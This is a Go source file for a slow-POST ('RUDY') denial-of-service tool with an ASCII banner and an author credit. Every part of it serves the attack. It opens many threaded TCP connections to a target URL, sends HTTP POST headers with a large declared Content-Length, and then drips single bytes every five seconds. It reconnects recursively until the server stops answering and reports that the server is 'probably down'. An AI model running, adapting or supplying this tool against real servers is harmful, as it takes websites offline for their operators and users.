package main

import (
	"flag"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

func Banner() {
	var banner = `

	                                                 
                             _       
                            | |      
  ____  ___   ____ _   _  _ | | ____ 
 / _  |/ _ \ / ___) | | |/ || |/ _  )
( ( | | |_| | |   | |_| ( (_| ( (/ / 
 \_|| |\___/|_|    \____|\____|\____)
(_____|                              
													


   Coded by: 6en6ar :)
												   
	`
	fmt.Println(banner)

}

var (
	u = flag.String("u", "", "url of the server")
	t = flag.Int("t", 10, "threads")
	//input_f = flag.Bool("input", false, "input fields")
	l = flag.Int("l", 1024, "length to send in the post request")
	//i = flag.String("i", "", "input fields for the form")
)

var mu sync.Mutex
var stop = false

func Attack(threads int, length int, path string, srv string, wg *sync.WaitGroup) {
	defer wg.Done()
	l := strconv.Itoa(length)
	// raw TCP HTTP POST req
	request :=
		"POST " + path + " HTTP/1.0\r\n" +
			"Host: " + srv + "\r\n" +
			"User-Agent: 6en6ar-Custom-UA\r\n" + // make UA cycling
			"Connection: keep-alive\r\n" +
			"Content-type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: " + l + "\r\n\r\n"
	//start a conn
	con, err := net.Dial("tcp", srv)
	if err != nil {
		fmt.Println(err)
		fmt.Println("[ - ] Connection to the server could not be established --> Maybe it crashed")
		mu.Lock()
		stop = true
		mu.Unlock()
		return
	}
	// send bytes over wire
	_, err = con.Write([]byte(request))
	if err != nil {
		fmt.Println(err)
	}
	for i := 1; i < length; i++ {
		if stop {
			return
		}
		_, err := con.Write([]byte("X"))
		if err != nil {
			fmt.Println(err)
			fmt.Println("[ - ] Sending bytes to server failed, trying again....")
			con.Close()
			Attack(threads, length, path, srv, wg)
		}
		// sleep
		time.Sleep(time.Second * 5)

	}
	con.Close()
	Attack(threads, length, path, srv, wg)

}
func main() {
	flag.Parse()
	Banner()
	fmt.Println("This is a Rudy Denial of Service Tool !")
	//parse path from url
	path, _ := url.Parse(*u)
	fmt.Println(path.Path)
	if path.Path == "" {
		path.Path = "/"
	}
	var wg sync.WaitGroup
	wg.Add(*t)
	fmt.Println("[ + ] Attacking server...")
	for i := 1; i <= *t; i++ {

		go Attack(*t, *l, path.Path, path.Host, &wg)

	}
	wg.Wait()
	fmt.Println("[ + ] Stopping attack server probably down....")
	os.Exit(1)

}
